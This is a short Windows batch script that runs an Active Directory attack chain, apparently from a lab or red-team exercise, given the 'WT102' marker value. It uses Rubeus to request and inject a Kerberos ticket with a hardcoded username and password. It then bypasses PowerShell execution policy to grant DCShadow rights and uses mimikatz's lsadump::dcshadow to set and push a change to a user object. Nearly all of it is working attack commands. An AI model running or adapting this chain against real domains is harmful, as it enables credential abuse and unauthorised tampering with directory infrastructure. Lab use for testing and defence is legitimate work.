@echo off
cd /d C:\Tools\ADTools
echo === STEP1 TGT ===
Rubeus.exe asktgt /user:chief_command /password:C0mm@nd_Ch1ef! /domain:cadre.local /ptt 1> wt102-1-tgt.out 2>&1
echo === STEP2 PERMS ===
powershell -ExecutionPolicy Bypass -File Set-DCShadowPermissions.ps1 -FakeDC ws01 -SamAccountName intern_blue -Username chief_command 1> wt102-2-perms.out 2>&1
echo === STEP3 DCShadow SET ===
mimikatz.exe "lsadump::dcshadow /object:intern_blue /attribute:description /value:WT102-DCShadow-MARKER" 1> wt102-3-set.out 2>&1
echo === STEP4 DCShadow PUSH ===
mimikatz.exe "lsadump::dcshadow /push" 1> wt102-4-push.out 2>&1
echo === ALL DONE ===
